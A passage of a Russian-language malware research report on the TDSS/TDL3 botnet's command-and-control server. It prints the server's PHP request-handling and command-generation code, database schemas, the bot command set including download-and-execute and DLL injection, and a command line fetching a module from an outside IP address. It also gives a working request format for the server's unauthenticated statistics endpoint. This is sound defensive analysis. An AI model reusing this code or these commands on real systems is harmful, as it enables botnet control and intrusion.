<td><code>aff_ID</code></td>
<td>Идентификатор партнёра, владеющего ботом</td>
</tr>
<tr>
<td><code>aff_SID</code></td>
<td>Идентификатор дополнительной учётной записи партнёра</td>

</tr>
<tr>
<td><code>rootkit_ver</code></td>
<td>Версия руткита</td>
</tr>
<tr>
<td><code>tdlcmd_ver</code></td>
<td>Версия модуля <code>TDLCMD.DLL</code> (основной модуль «полезной назрузки» бота)</td>
</tr>
<tr>

<td><code>os_ver</code></td>
<td>Версия операционной системы</td>
</tr>
<tr>
<td><code>lang</code></td>
<td>Язык операционной системы</td>
</tr>
<tr>
<td><code>browser</code></td>
<td>Браузер, используемый на заражённом компьютере. Значение этого поля 
представляет собой путь к исполняемому файлу браузера, извлеченный из 
ключа реестра <code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\HTTP\shell\open\command</code></td>

</tr>
<tr>
<td><code>build_date</code></td>
<td>Дата сборки исполняемых файлов бота (необязательный параметр)</td>
</tr>
<tr>
<td><code>install_date</code></td>
<td>Дата заражения (необязательный параметр)</td>
</tr>
</tbody>
</table>

<p>Помимо запросов на получение команд, скрипты командного сервера также
 могут обрабатывать и ряд специальных запросов, которые имеют следующий 
вид:</p>

<pre class="oneliner">module_ID|value_1|value_2|...|value_N</pre>

<table class="text">
<colgroup><col width="25%">
<col width="75%">
</colgroup><thead>
<tr>
<td>Поле</td>
<td>Назначение</td>
</tr>
</thead>
<tbody>
<tr>

<td><code>module_ID</code></td>
<td>Идентификатор типа запроса (модуля, которому он адресован)</td>
</tr>
<tr>
<td><code>value_1</code>–<code>value_N</code></td>
<td>Произвольное количество строковых и/или числовых данных, формат и назначения которых зависят от типа запроса</td>
</tr>
</tbody>
</table>

<p>Функциональность отправки специальных запросов не фигурирует в коде 
«полезной нагрузки» бота в явном виде, однако бот может отправлять 
подобные запросы в результате обработки команд, полученных с сервера 
(например, команды на загрузку дополнительного модуля «полезной 
нагрузки»).</p>

<p>Рассмотрим процесс обработки запросов от бота более подробно. В первых строках скрипта <code>/var/www/engine/index.php</code> происходит подключение необходимых заголовочных файлов, а также расшифровка запроса:</p>

<pre>&lt;?php
try {

    // объявление констант, содержащих пути к различным директориям
    define('DS'                    , DIRECTORY_SEPARATOR       );
    define('DIR_ROOT'              , realpath('../')           );
    define('DIR_LIBRARY'           , DIR_ROOT.DS.'library'     );
    define('DIR_LIBRARY_CLASSES'   , DIR_LIBRARY.DS.'classes'  );
    define('DIR_LIBRARY_MODELS'    , DIR_LIBRARY.DS.'models'   );
    define('DIR_LIBRARY_FUNCTIONS' , DIR_LIBRARY.DS.'functions');
    define('DIR_DATA'              , DIR_ROOT.DS.'data'        );

    // подключение внешних модулей
    require_once( DIR_ROOT . DS . 'configuration.php' );
    require_once( DIR_LIBRARY_CLASSES . DS . 'DBase.php' );
    require_once( DIR_LIBRARY_FUNCTIONS . DS . 'rc4Encrypt.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mBots.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mAffiliate.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mAffiliates.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mBrowsers.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mBuilds.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mSystems.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mCountries.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mCommands.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mCommandsMemcache.php' );
    
    // расшифровка запроса по RC4 (имя сервера используется в качестве ключа)
    $request      = rc4Decrypt( $_SERVER["HTTP_HOST"], base64_decode( substr( $_SERVER["REQUEST_URI"], 1 ) ) ); 
    $requestCount = 0;
    $requestHost = $_SERVER["HTTP_HOST"];

    if( $request ) {
        // разбиение строки запроса на элементы массива
        $request      = explode( '|', $request );
        $requestCount = sizeof( $request );
    } else {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

    ...</pre>

<p>Поля запроса, как видно из приведённого кода, сохраняются в массиве <code>$request</code>.
 Далее, в зависимости от значения первого элемента этого массива (а 
именно, идентификатора типа для специальных запросов), происходит 
подключение одного из следующих PHP-скриптов, обрабатывающих конкретные 
типы запросов:</p>

<table class="text">
<colgroup><col width="20%">

<col width="20%">
<col width="60%">
</colgroup><thead>
<tr>
<td>Идентификатор типа специального запроса</td>
<td>Имя скрипта</td>
<td>Назначение</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>remover</code></td>
<td><code>remover.php</code></td>

<td>Приём статистики от модуля <code>remover</code> (подробнее о нём см. далее)</td>
</tr>
<tr>
<td><code>services</code></td>
<td><code>services.php</code></td>
<td>Управление учётными записями партнёров (создание, удаление, запрос 
информации). По всей видимости, эти возможности были предусмотрены для 
сбора статистики об учётных записях партнёров с внешнего хоста, однако 
по неизвестным причинам не был защищён какими-либо механизмами 
авторизации, что позволяет получить доступ к подробнейшей статистике о 
работе ботнета произвольным лицам.</td>
</tr>
<tr>
<td><code>rules</code></td>

<td><code>rules.php</code></td>
<td>Приём статистики о выполненных на стороне бота командах.</td>
</tr>
<tr>
<td><code>redirect</code></td>
<td><code>redirect.php</code></td>
<td>Выполнение перенаправления на содержащийся в базе URL по его числовому идентификатору.</td>
</tr>
<tr>
<td><code>installation</code></td>
<td><code>installation.php</code></td>

<td>Вывод содержимого файла <code>/var/www/engine/data/<em>affId</em>_<em>affSid</em>.dat</code>, где <code><em>affId</em></code> и <code><em>affSid</em></code>
 — идентификаторы основной и дополнительной учетных записей партнёра, 
полученные из полей запроса. Назначение информации, содержащейся в <code>.dat</code>-файле, неизвестно, поскольку соответствующих файлов на целевом сервере обнаружено не было.</td>
</tr>

<tr>
<td><code>modules</code></td>
<td><code>modules.php</code></td>
<td>Обработка запросов на загрузку модулей со стороны ботов.</td>
</tr>
</tbody>
</table>

<p>Если значение первого элемента массива не совпало с приведенными в 
таблице идентификаторами, то такой запрос обрабатывается как запрос 
команды:</p>

<pre>    } elseif( $requestCount == 8 || $requestCount == 10 ) {
    
        // подключение к базе данных
        DBase::connect( DBASE_HOST , DBASE_USER , DBASE_PWD , DBASE_BASE );
    
        // подключение к демону memcached
        $objMemcache = new Memcache;
        $objMemcache-&gt;connect( MCACHE_HOST, MCACHE_PORT );
        
        // получение информации о боте из полей запроса
        $requestName      = $request[0];
        $requestAffAid    = $request[1];
        $requestAffSid    = $request[2];
        $requestRk        = $request[3];
        $requestCmd       = $request[4];
        $requestSystem    = $request[5];
        $requestLang      = $request[6];
        $requestBrowser   = $request[7];
        
        if( $requestCount == 8 ) {    
            // информация о дате сборки и дате заражения не присутствует в запросе        
            $requestBuildDate   = 0;
            $requestInstallDate = 0;
        } else {
            $requestBuildDate   = strtotime( $request[8] );
            $requestInstallDate = strtotime( $request[9] );
        }

        $requestBuild     = "{$requestRk}_{$requestCmd}";
        $requestIp        = ip2long( $_SERVER['REMOTE_ADDR'] );

        $requestAffId     = null;
        $requestSystemId  = null;
        $requestBrowserId = null;
        $requestBuildId   = null;

        // подключение модуля engine.php
        // он осуществляет добавление информации о боте в базу данных и обработку запроса команды
        include('engine.php');
        
        $objMemcache-&gt;close();
        DBase::disconnect(); 
        
        ...</pre>

<p>Возвращаемый боту в ответ на запрос список команд также шифруется по 
алгоритму RC4, но в качестве ключа в этом случае используется не имя 
сервера, а идентификатор бота (содержимое переменной <code>$requestName</code>).</p>

<h3 id="s13">Учётные записи партнёров</h3>

<p>В таблице <code>affiliates</code> содержится информация об учётных 
записях партнёров. Их добавление и редактирование доступно оператору 
панели администрирования ботнета.</p>

<pre>CREATE TABLE IF NOT EXISTS `affiliates` (
  `affId` int(11) unsigned NOT NULL auto_increment,   -- ключ таблицы
  `affAid` char(20) NOT NULL,                         -- идентификатор учётной записи партнёра
  `affGroup` int(11) unsigned NOT NULL,               -- группа учётной записи партнёра
  `affLogin` char(32) default NULL,                   -- имя (логин) учётной записи партнёра
  PRIMARY KEY  (`affId`)
);</pre>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/edit_aff.png" width="709" height="267" alt="Редактирование учётной записи партнёра в панели администрирования ботнета"><p>Редактирование учётной записи партнёра в панели администрирования ботнета</p></div>

<p>Каждый партнёр может владеть произвольным количеством ботов. 
Идентификатор учётной записи партнёра «прошивается» в исполняемый файл 
бота на этапе его сборки и конфигурирования и хранится руткитом в файле <code>config.ini</code> на зашифрованной файловой системе.</p>

<p>Также для каждого партнёра доступно создание дополнительных учётных 
записей, которые используются для разделения ботов, принадлежащих 
конкретному партнёру, на группы.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/config_ini.png" width="547" height="132" alt="Идентификаторы основной и дополнительной учётных записей партнёра в файле config.ini"><p>Идентификаторы основной и дополнительной учётных записей партнёра в файле <code>config.ini</code>.</p></div>

<p>Учётными записями партнёров можно управлять без посредства панели администрирования, путём отправки специальных запросов типа <code>services</code> веб-шлюзу командного сервера. Формат параметров этого запроса выглядит так:</p>

<pre class="oneliner">services|operation_code|argument_1|argument_2|...|argument_N</pre>

<table class="text">
<colgroup><col width="25%">
<col width="75%">
</colgroup><thead>
<tr>
<td>Поле</td>

<td>Назначение</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>operation_code</code></td>
<td>Код операции, которую необходимо выполнить</td>
</tr>
<tr>
<td><code>argument_1</code>–<code>argument_N</code></td>
<td>Необязательные аргументы, формат которых определяется конкретной операцией</td>

</tr>
</tbody>
</table>

<p>Коды операций приведены в следующей таблице:</p>

<table class="text">
<colgroup><col width="10%">
<col width="20%">
<col width="70%">
</colgroup><thead>
<tr>
<td>Код операции</td>
<td>Аргументы</td>

<td>Назначение</td>
</tr>
</thead>
<tbody>
<tr>
<td class="num">100</td>
<td><code>affAid</code>, <code>affLogin</code>, <code>affGroup</code></td>
<td>Создание новой учётной записи партнёра.</td>
</tr>

<tr>
<td class="num">110</td>
<td><code>affId</code></td>
<td>Удаление существующей учётной записи партнёра.</td>
</tr>
<tr>
<td class="num">120</td>
<td><code>affAid</code></td>
<td>Перечисление всех дополнительных учётных записей для данной учётной записи партнёра.</td>
</tr>
<tr>

<td class="num">150</td>
<td><code>engineType</code></td>
<td>Добавление новой учётной записи партнёра с автоматической генерацией значения <code>affAid</code>. При этом значение <code>affGroup</code> выбирается в зависимости от значения <code>engineType</code>.</td>
</tr>
<tr>
<td class="num">200</td>

<td><code>affAid</code>, <code>affSid</code>, <code>statDateFrom</code>, <code>statDateTo</code></td>
<td>Запрос статистики по количеству установок бота для указанной учётной записи партнёра в заданный промежуток времени.</td>
</tr>
<tr>
<td class="num">201</td>
<td><code>affAid</code>, <code>affSid</code>, <code>statDateFrom</code>, <code>statDateTo</code></td>

<td>Запрос статистики количества ботов по странам для указанной учётной записи партнёра в заданный промежуток времени.</td>
</tr>
<tr>
<td class="num">301</td>
<td>—</td>
<td>Перечисление существующих учётных записей партнёров.</td>
</tr>
</tbody>
</table>

<p>Пояснение назначения параметров запроса:</p>

<table class="data">
<colgroup><col width="25%">
<col width="75%">
</colgroup><thead>
<tr>
<td>Параметр</td>
<td>Назначение</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>affId</code></td>
<td rowspan="4">Параметры соответствуют одноимённым полям в таблице <code>affiliates</code></td>

</tr>
<tr>
<td><code>affAid</code></td>
</tr>
<tr>
<td><code>affSid</code></td>
</tr>
<tr>
<td><code>affLogin</code></td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>statDateFrom</code></td>

<td rowspan="2">Даты в формате <code>Y-m-d</code></td>
</tr>
<tr>
<td><code>statDateTo</code></td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>affGroup</code></td>
<td>Идентификатор группы партнёров</td>
</tr>
</tbody>

</table>

<p>Перечень возможных групп, к которым может принадлежать партнёр, содержится в файле <code>/var/www/engine/data/groups.txt</code>:</p>

<pre>Affiliates Groups
    1  - Test Installs
    10 - Our Installs
    20 - InstallConverter
    30 - ProfitCash
    40 - ReliefPPC
    50 - ConvertPPC</pre>

<p>Для примера, запрос получения статистики по количеству установок бота
 в период с 01.08.2009 по 01.07.2010 для дополнительного учётной записи 0
 партнёра с <code>affAid</code>, равным 10000, будет выглядеть следующим образом:</p>

<pre class="oneliner">services|200|10000|0|2009-08-01|2010-07-01</pre>

<h3 id="s14">Таблица ботов</h3>

<p>Информация о боте представляет собой запись в таблице <code>bots</code>, которая создаётся при обработке первого запроса на получение команд от бота. При этом значения полей таблицы <code>affId</code>, <code>affSid</code> и <code>botName</code> извлекаются из соответствующих параметров запроса.</p>

<p>Класс <code>mBots</code>, обеспечивающий работу с таблицей <code>bots</code>, находится в файле <code>/var/www/engine/library/models/mBots.php</code>. Функции добавления и изменения информации о боте реализованы в скрипте <code>/var/www/engine/public/engine.php</code>.</p>

<p>Структура таблицы <code>bots</code>:</p>

<pre>CREATE TABLE IF NOT EXISTS `bots` (                  
  `affId` int(11) unsigned NOT NULL,                  -- идентификатор учётной записи партнёра
  `affIdx` int(11) unsigned NOT NULL,                 -- обычно, содержит то же значение, что и affId
  `affSid` smallint(6) unsigned NOT NULL default '1', -- идентификатор дополнительной учётной записи
  `botId` int(11) unsigned NOT NULL auto_increment,   -- ключ таблицы
  `botName` char(60) NOT NULL,                        -- уникальное имя бота (параметр botid в config.ini)
  `botIp` bigint(20) NOT NULL,                        -- IP-адрес бота
  `botAdded` int(11) unsigned NOT NULL,               -- дата первого обращения бота к серверу
  `botAccess` int(11) unsigned NOT NULL,              -- дата последнего обращения бота к серверу
  `botCountry` tinyint(4) unsigned NOT NULL,          -- идентификатор страны бота
  `botSystem` smallint(6) unsigned NOT NULL,          -- идентификатор версии Windows заражённого компьютера
  `botBrowser` smallint(6) unsigned NOT NULL,         -- идентификатор версии браузера заражённого компьютера
  `botBuild` smallint(6) unsigned NOT NULL,           -- идентификатор версии руткита и модуля TDLCMD.DLL бота
  PRIMARY KEY  (`botId`),
  KEY `botName` (`botName`),
  KEY `affid_index` (`affId`),
  KEY `botAdded_index` (`botAdded`)
);</pre>

<h3 id="s15">Система команд</h3>

<p>В конце скрипта <code>engine.php</code> подключается файл <code>/var/www/enginedata/commands.php</code>. Его задача — вывод команд, которые требуется выполнить боту. При этом скрипт <code>commands.php</code> генерируется динамически на основе данных, хранящихся в таблице <code>commandsinfo</code>.</p>

<pre>CREATE TABLE IF NOT EXISTS `commandsinfo` (
  `commOwner` int(11) NOT NULL default '1',           -- идентификатор учётной записи пользователя, добавившего команду
  `commId` int(11) unsigned NOT NULL auto_increment,  -- ключ таблицы
  `commName` varchar(255) NOT NULL,                   -- имя команды
  `commDesc` text NOT NULL,                           -- описание команды
  `commExe` varchar(255) NOT NULL,                    -- URL исполняемого файла (для команд, связанных с загрузкой и исполнением исполняемых файлов)
  `commStatus` enum('disable','enable',
      'deleted','temp') NOT NULL default 'enable',    -- статус команды (активная, неактивная, временная или удалённая)
  `commAdded` datetime NOT NULL,                      -- время добавления команды
  `commCode` text NOT NULL,                           -- PHP код команды, который будет включён в commands.php
  `commCodeCond` text NOT NULL,                       -- дополнительные параметры команды
  `commCodeComm` text NOT NULL,
  `commOrder` int(11) NOT NULL,                       -- порядковый номер команды
  PRIMARY KEY  (`commId`)
);</pre>

<p>Класс <code>mCommands</code>, обеспечивающий работу с командами, находится в файле <code>/var/www/engine/library/models/mCommands.php</code>. Процедура динамического создания файла <code>commands.php</code> реализована в методе <code>reGenerate</code>, который вызывается по команде из панели администрирования:</p>

<pre>    function reGenerate() {
        $code = '';
        
        // получение из базы данных информации о всех доступных командах
        $commands = $this-&gt;getSummaryFull();
        for ($i = 0; $i &lt; sizeof($commands); $i++) {
            if ($commands[$i]['commStatus'] == 'enable') {
                // получение PHP кода для каждой из команд
                $code .= $this-&gt;getCode($commands[$i]['commId']) . "\r\n\r\n\r\n";
            }
        }
        
        // чтение файла-шаблона
        // он содержит статический код, который должен быть включён в commands.php
        $templateFile = dirname(__FILE__).DS.'commands.template';
        $fp = fopen($templateFile, 'r');
        $template = fread($fp, filesize($templateFile));
        fclose($fp);
        
        $template = str_replace('%COMMS%', $code, $template);
        
        // запись commands.php на диск
        $file = '/var/www/enginedata/commands.php';
        $fp = fopen($file, 'w');
        fwrite($fp, $template);
        fclose($fp);
    }</pre>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/add_command.png" width="574" height="383" alt="Добавление новой команды в панели администрирования"><p>Добавление новой команды в панели администрирования</p></div>

<p>Для каждой команды можно указать следующие дополнительные параметры:</p>

<ul>
<li>Идентификаторы стран, для ботов из которых требуется выполнение данной команды.</li>
<li>Идентификаторы учётных записей партнёров.</li>
<li>Версии браузеров на зараженных машинах.</li>
<li>Версии руткита и модуля <code>TDLCMD.DLL</code>.</li>

<li>Время жизни команды.</li>
<li>Максимальное число запусков команды.</li>
</ul>

<p>Оператор панели администрирования может даже редактировать непосредственно фрагмент PHP-кода, который будет включён в <code>commands.php</code>.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/edit_command_code.png" width="790" height="443" alt="Редактирование кода команды в панели администрирования"><p>Редактирование кода команды в панели администрирования</p></div>

<p>Бот может обрабатывать следующие команды:</p>

<table class="text">
<colgroup><col width="40%">
<col width="60%">
</colgroup><thead>
<tr>
<td>Команда</td>
<td>Описание</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>botnetcmd.SetCmdDelay(<em>Seconds</em>)</code></td>

<td>Установка интервала обращения к серверу</td>
</tr>
<tr>
<td><code>botnetcmd.ModuleDownloadUnxor(<em>URL</em>, <em>LocalPath</em>)</code></td>
<td>Загрузка зашифрованного исполняемого модуля</td>
</tr>
<tr>
<td><code>botnetcmd.FileDownloadRandom(<em>URL</em>, <em>LocalPath</em>)</code></td>

<td>Загрузка произвольного файла</td>
</tr>
<tr>
<td><code>botnetcmd.LoadExe(<em>FileURL</em>)</code></td>
<td>Загрузка и запуск исполняемого файла</td>
</tr>
<tr>
<td><code>botnetcmd.LoadExeKnock(<em>FileURL</em>, <em>KnockURL</em>)</code></td>

<td>Загрузка и запуск исполняемого файла с отправкой HTTP-запроса на произвольный URL в случае успеха</td>
</tr>
<tr>
<td><code>botnetcmd.InjectorAdd(<em>ProcessName</em>, <em>DLLName</em>)</code></td>
<td>Внедрение DLL в указанный процесс (<code>*</code> — во все процессы)</td>
</tr>
<tr>

<td><code>tdlcmd.ConfigWrite(<em>Section</em>, <em>Parameter</em>, <em>Value</em>)</code></td>
<td>Запись произвольных данных в <code>config.ini</code></td>
</tr>
<tr>
<td><code>tdlcmd.Download(<em>URL</em>, <em>LocalPath</em>)</code></td>

<td>Загрузка произвольного файла.</td>
</tr>
</tbody>
</table>

<h3 id="s16">Модули «полезной нагрузки»</h3>

<p>Основные функции руткита TDL3 — «полезная нагрузка» — обеспечиваются 
дополнительными модулями. Модули представляют собой обычные динамические
 библиотеки, загружаемые с сервера и внедряемые в произвольный либо 
текущий процесс пользовательского режима.</p>

<p>Информация о доступных модулях хранится в таблице modules:</p>

<pre>CREATE TABLE IF NOT EXISTS `modules` (
  `modId` int(11) unsigned NOT NULL auto_increment,   -- ключ таблицы
  `modName` char(255) NOT NULL,                       -- имя модуля
  `modData` longblob,                                 -- данные исполняемого образа модуля
  `modLoads` int(11) unsigned NOT NULL,               -- количество загрузок модуля
  PRIMARY KEY  (`modId`)
);</pre>

<p>Загрузка файла модуля на заражённый компьютер может производиться с помощью команды <code>ModuleDownloadUnxor</code>. В качестве параметра ей передаётся зашифрованный запрос к серверу, формат полей которого выглядит следующим образом:</p>

<pre class="oneliner">module|ModuleId!Key!</pre>

<table class="text">
<colgroup><col width="25%">
<col width="75%">
</colgroup><thead>
<tr>
<td>Поле</td>
<td>Назначение</td>

</tr>
</thead>
<tbody>
<tr>
<td><code>ModuleId</code></td>
<td>Идентификатор модуля (значение поля <code>modId</code> таблицы <code>modules</code>)</td>
</tr>
<tr>
<td><code>Key</code></td>

<td>Любая строка (необязательное поле). Значение данного параметра будет
 использовано в качестве ключа шифрования по алгоритму RC4 для модуля, 
выдаваемого боту в ответ на запрос</td>
</tr>
</tbody>
</table>

<p>Запрос на загрузку модуля обрабатывается в файле <code>/var/www/engine/public/modules.php</code>:</p>

<pre>&lt;?php

    require_once( DIR_LIBRARY_MODELS . DS . 'mModules.php' );

    // проверка наличия ключа для шифрования в запросе на загрузку модуля
    if( preg_match( "%(\d*)!(.*)!%Uis", $request[1], $matches ) ) {
        $modId    = $matches[1];
        $modCrypt = $matches[2];
    } else {
        $modId    = $request[1];
        $modCrypt = FALSE;
    }
 
    // получение информации о модуле
    $modDetails = mModules::details( $modId );

    if( $modCrypt ) {
        // возвращение клиенту данных модуля в зашифрованном виде
        print rc4Encrypt( $modCrypt, $modDetails['modData'] );
    } else {
        // возвращение клиенту данных модуля в открытом виде
        print $modDetails['modData'];
    }
    
    // приращение счётчика количества загрузок для данного модуля
    mModules::increment( $modId );</pre>

<p>Исполнение команды, адресованной конкретному модулю, происходит путём отправки боту строки следующего вида:</p>

<pre class="oneliner">ModuleName.Function([Params])</pre>

<table class="text">
<colgroup><col width="25%">
<col width="75%">
</colgroup><thead>
<tr>
<td>Поле</td>
<td>Назначение</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>ModuleName</code></td>

<td>Имя динамической библиотеки модуля на заражённом компьютере</td>
</tr>
<tr>
<td><code>Function</code></td>
<td>Имя произвольной функции, экспортируемой динамической библиотекой модуля</td>
</tr>
<tr>
<td><code>Params</code></td>
<td>Произвольные числовые или строковые параметры, которые следует передать вызываемой функции в качестве аргументов</td>
</tr>
</tbody>
</table>

<p>Пример загрузки и исполнения модуля <code>remover</code> (фрагмент кода из <code>commands.php</code>):</p>

<pre>// --- Command #273 Start ---

    $commId = 273;
    
    // получение информации о команде по её идентификатору
    $commDetails       = $objCommands-&gt;getCommand( $commId );
    $commDetailsCreate = FALSE;
    if( $commDetails == FALSE ) {
        $commDetails['commId']       = $commId;
        $commDetails['commRefences'] = 0;
        $commDetails['commSuccesed'] = 0;
        $commDetailsCreate           = TRUE;
    }
    
    // Condition 1
    if( $botBuild &gt;= 26 ) {
        $commDetailsBot       = mCommands::getCommandExecuted( $commId, $botId );
        $commDetailsBotCreate = FALSE;
        if( $commDetailsBot == FALSE ) {
            $commDetailsBot['botId']        = $botId;
            $commDetailsBot['commId']       = $commId;
            $commDetailsBot['commDate']     = 0;
            $commDetailsBot['commSuccesed'] = 0;
            $commDetailsBotCreate           = TRUE;
        }
        
        // Condition 2
        if( ($commDetailsBot['commSuccesed'] &lt; 1) ) {
            $commSucces  = TRUE;
            // команда на загрузку модуля и сохранение его под именем tdlrm.dll
            $commOutput .= "tdlcmd.Download('https://91.212.226.60/czRvvJ+iknAB','tdlrm.dll')\n";
            // команда на исполнение функции Start() из tdlrm.dll
            $commOutput .= "tdlrm.Start()\n";
        } else {
            $commSucces  = FALSE;
        }
        
        ...
    
// --- Command #273 End ---</pre>

<p>Добавление и редактирование модулей происходит в соответствующем разделе панели администрирования:</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/modules.png" width="572" height="243" alt="Редактирование модуля в панели администрирования"><p>Редактирование модуля в панели администрирования</p></div>

<p>На момент получения доступа к серверу в базе данных присутствовали следующие модули:</p>

<table class="text">
<colgroup><col width="20%">
<col width="80%">
</colgroup><thead>
<tr>
<td>Имя модуля</td>
<td>Назначение</td>
</tr>

</thead>
<tbody>
<tr>
<td><code>DDoS</code></td>
<td>Реализация DDoS-атак</td>
</tr>
<tr>
<td><code>Remover</code></td>
<td>Небольшой антивирус, работающий с базами сигнатур <a href="https://web.archive.org/web/20180310124741/http://www.malwarebytes.org/mbam.php">Malwarebytes' Anti-Malware</a> и производящий на зараженном компьютере поиск «чужих» вредоносных программ.</td>
</tr>

<tr>
<td><code>TDLCMD</code></td>
<td>Основной модуль «полезной нагрузки», используемый руткитом. В данном
 модуле реализованы функции отправки сообщений серверу, выполнения 
команд и т.п.</td>
</tr>
<tr>
<td><code>WSP/WSP Popup</code></td>
<td>Модуль перехвата запросов для поисковых сервисов (Google, Yahoo, 
Bing, Ask, AOL) с целью подмены результатов поиска, отображаемых в 
браузере. Также содержит функции отображения всплывающих рекламных окон.</td>
</tr>
</tbody>
</table>

<p>Модули защищены при помощи неизвестной программы для шифрования кода, что может затруднить их анализ.</p>

<p>На момент анализа числа загрузок для модуля <code>Remover</code> 
составляло 19&nbsp;000 — таким образом, количество его загрузок 
несопоставимо мало относительно общего количества ботов. Это может 
свидетельствовать о том, что модуль <code>Remover</code> на момент 
анализа проходил тестирование, и что в будущем разработчиками бота 
планируется широкое использование своего собственного «антивируса» для 
борьбы с конкурирующими вредоносными программами.</p>

<h3 id="s17">Статистика</h3>

<p>В завершении статьи приведём несколько срезов статистики по ботнету. 
Статистические данные были получены путём анализа базы данных командного
 сервера <code>d45648675.cn</code> по состоянию на 7 февраля 2010 года.</p>

<p>Общие данные:</p>

<table class="text">
<colgroup><col width="75%">
<col width="25%">
</colgroup><tbody>
<tr>
<td>Количество ботов за всё время</td>
<td class="num">5&nbsp;247&nbsp;115</td>
</tr>
<tr>

<td>Количество учётных записей партнёров</td>
<td class="num">512</td>
</tr>
<tr>
<td>Дата установки первого бота</td>
<td class="num">12.08.2009</td>
</tr>
<tr>
<td>Дата установки последнего бота</td>
<td class="num">07.02.2010</td>
</tr>

</tbody>
</table>

<p>Более подробные статистические данные приведены ниже в виде графиков и диаграмм.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/stat_infected_machines.png" width="600" height="330" alt="Число новых установок по неделям (одна точка на графике соответствует одной неделе)"><p>Число новых установок по неделям (одна точка на графике соответствует одной неделе)</p></div>

<p>Заметный пик на графике соответствует «рекорду» в 443&nbsp;364 
уникальные установки бота 19 января 2010 года. Все установки были 
относительно равномерно распределены между несколькими десятками 
партнёрских учётных записей. Это может говорить о том, что причиной 
столь стремительного роста числа инсталляций стала волна эксплуатации 
некой уязвимости «нулевого дня».</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/stat_total_bots.png" width="600" height="330" alt="Число уникальных ботов, которые обращались к серверу в течение недели"><p>Число уникальных ботов, которые обращались к серверу в течение недели</p></div>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/stat_countries.png" width="600" height="400" alt="Распределение ботов по странам"><p>Распределение ботов по странам</p></div>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/stat_aff.png" width="600" height="400" alt="Распределение ботов по партнёрам"><p>Распределение ботов по партнёрам</p></div>

<p>Как видно из диаграммы, самый крупный партнёр обеспечивал 22,3% всех 
инсталляций руткита, вдвое превышая по эффективности второго партнёра.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/stat_aff_cat.png" width="600" height="400" alt="Распределение новых инсталляций по партнёрам"><p>Распределение новых инсталляций по партнёрам</p></div>

<p>Как видно из диаграммы, 90% партнёров обеспечивают от 1&nbsp;000 до 
50&nbsp;000 загрузок, из которых 50% приходится на мелких партнёров 
(число загрузок от 1&nbsp;000 до 5&nbsp;000). Партнёров с числом 
загрузок более 5&nbsp;000 всего 17, из них всего один обеспечил более 
1&nbsp;000&nbsp;000 загрузок.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/stat_os_ver.png" width="600" height="300" alt="Версии Windows"><p>Версии Windows</p></div>

<p>Как видно из диаграммы, операционная система Windows XP, в которой не
 поддерживаются современные защитные механизмы (UAC, DEP и ASLR), 
является наиболее уязвимой для вредоносных программ. Относительно малое 
число заражений операционной системы Windows 7 не связано с долей данной
 операционной системы в числе остальных (которая достаточно высока). 
Можно предположить, что доставка бота на компьютеры с Windows 7 
осуществлялась преимущественно методами социальной инженерии.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/stat_rootkit_ver.png" width="600" height="300" alt="Версии руткита"><p>Версии руткита</p></div>

